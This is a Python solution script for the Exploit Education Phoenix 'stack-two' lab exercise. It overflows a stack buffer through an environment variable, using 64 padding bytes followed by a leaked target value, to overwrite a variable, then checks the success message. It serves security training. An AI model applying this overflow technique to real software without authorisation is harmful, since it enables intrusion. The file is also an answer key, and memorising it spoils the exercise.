import os
from subprocess import Popen, PIPE
import re


FILE_PATH = "/opt/phoenix/i486/stack-two"
os.environ["ExploitEducation"] = "A" * 65

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.stdout.read().decode()
p.kill()

value = re.findall(r"we want 0x(\w+)", reply)[0]
value = bytearray.fromhex(value)[::-1].decode()

payload = "A" * 64 + value 
os.environ["ExploitEducation"] = payload

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.stdout.read().decode()
assert "Well done, you have successfully set changeme to the correct value" in reply
print("Success!")





